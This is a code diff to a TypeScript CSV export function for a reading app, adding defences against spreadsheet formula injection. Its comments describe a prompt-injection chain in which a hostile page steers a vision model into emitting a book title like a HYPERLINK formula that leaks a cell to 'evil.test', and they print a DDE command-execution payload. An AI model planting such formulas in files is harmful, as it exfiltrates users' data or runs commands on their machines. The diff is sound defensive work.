@@ -34,6 +34,39 @@ function field(value: string): string {
   return /[",\n\r]/.test(value) ? `"${value.replace(/"/g, '""')}"` : value;
 }
 
+/**
+ * A cell holding text this repo did not write, made safe to open in a spreadsheet.
+ *
+ * THE TITLE IS NOT THE READER'S WORDS AND IT IS NOT OURS. It is what a vision model read
+ * off a picture, and the picture came from a page Buki does not control. That makes it
+ * untrusted input which has crossed a trust boundary, and CSV is a format Excel, Sheets,
+ * LibreOffice and Numbers all EXECUTE when a cell begins `=`, `+`, `-` or `@`.
+ *
+ * The chain is short: a hostile page carries text steering the model to answer with a
+ * title of `=HYPERLINK("http://evil.test?"&A2,"Open")`, the reader saves the book, and
+ * months later opens their export to look at it before uploading — which is exactly what
+ * `isbnCell` below already assumes people do. One click sends the neighbouring cell to a
+ * stranger. `OPENWORK.md` item 46, TM-8.
+ *
+ * QUOTING IS NOT A DEFENCE. CSV quoting is stripped before the cell is evaluated, so
+ * `"=cmd|..."` executes exactly as `=cmd|...` does. The apostrophe is: every one of those
+ * four programs treats a leading `'` as "this cell is text", and none of them displays it.
+ *
+ * ONLY WHEN THE VALUE ACTUALLY STARTS WITH ONE, and that restraint is the point. The
+ * primary path for this file is UPLOAD to Goodreads or StoryGraph, not Excel, and those
+ * importers read the bytes rather than evaluating them — so an apostrophe on every title
+ * would corrupt every title on the honest path to defend the rare one. A real book whose
+ * title opens with `-` pays a leading apostrophe on import; a title opening with `=` is not
+ * a book title.
+ *
+ * DELIBERATELY NOT APPLIED TO `isbnCell`, which emits `="978…"` and means to. See there.
+ */
+const FORMULA = /^[=+\-@\t\r]/;
+
+function text(value: string): string {
+  return field(FORMULA.test(value) ? `'${value}` : value);
+}
+
 /** Local date parts, so the file says the day the reader would say. */
 function parts(at: number): [string, string, string] {
   const d = new Date(at);
@@ -55,8 +88,27 @@ function parts(at: number): [string, string, string] {
  * names in Excel the same way but risks the importer reading the first column as
  * "﻿Title" and failing to find Title at all. The primary path is upload, not Excel,
  * so the wrapper is worth it and the BOM is not.
+ *
+ * BUT `="…"` IS ITSELF A FORMULA, so the value inside it has to be one this repo can
+ * vouch for. A quote in that position breaks out: `="x"&cmd|'/c calc'!A0&""` is a live
+ * DDE concatenation, and CSV quoting does not touch it because quoting is stripped before
+ * the cell is evaluated. The page cannot reach here — `extractIsbnFromLinks` validates to
+ * `[0-9X]{10}` — but OPENLIBRARY CAN: `openLibrary.ts:44` takes `doc.isbn[0]` out of a
+ * JSON response and casts it, and openlibrary.org is a wiki anyone may edit.
+ *
+ * So the formula form is earned by shape, not assumed. Anything else falls through to a
+ * plain text cell: the reader still keeps whatever the catalogue said about their book,
+ * they simply do not execute it.
  */
-const isbnCell = (isbn?: string): string => (isbn ? `="${isbn}"` : '');
+const ISBN_SHAPE = /^[0-9-]{9,16}[0-9X]$/i;
+
+function isbnCell(isbn?: string): string {
+  if (!isbn) return '';
+  // This function owns the WHOLE cell, quoting included, because the choice between the
+  // formula form and a text cell cannot be made by a caller applying one escape to all
+  // seven columns. That uniform `.map(field)` is what the earlier version did.
+  return ISBN_SHAPE.test(isbn) ? field(`="${isbn}"`) : text(isbn);
+}
 
 /** The post that sold you. Empty when there is none, never an invented sentence. */
 const reviewCell = (saved: SavedBook): string =>
@@ -66,17 +118,19 @@ const reviewCell = (saved: SavedBook): string =>
 export function toGoodreadsCsv(books: SavedBook[]): string {
   const rows = books.map((saved) => {
     const [y, m, d] = parts(saved.savedAt);
+    // Per field, NOT `.map(field)`. Two of these carry what a vision model read off a
+    // picture on somebody else's page, one carries a URL from that page, and three are
+    // values this module built from an enum and a clock. `isbnCell` is a formula on
+    // purpose. A single uniform escape over all seven is exactly what breaks the ISBN.
     return [
-      saved.book.title,
-      saved.book.author,
+      text(saved.book.title),
+      text(saved.book.author),
       isbnCell(saved.book.isbn),
-      SHELF[saved.intent],
-      `buki-${saved.intent}`,
-      `${y}/${m}/${d}`,
-      reviewCell(saved),
-    ]
-      .map(field)
-      .join(',');
+      field(SHELF[saved.intent]),
+      field(`buki-${saved.intent}`),
+      field(`${y}/${m}/${d}`),
+      text(reviewCell(saved)),
+    ].join(',');
   });
   return [HEADER.join(','), ...rows].join('\n');
 }
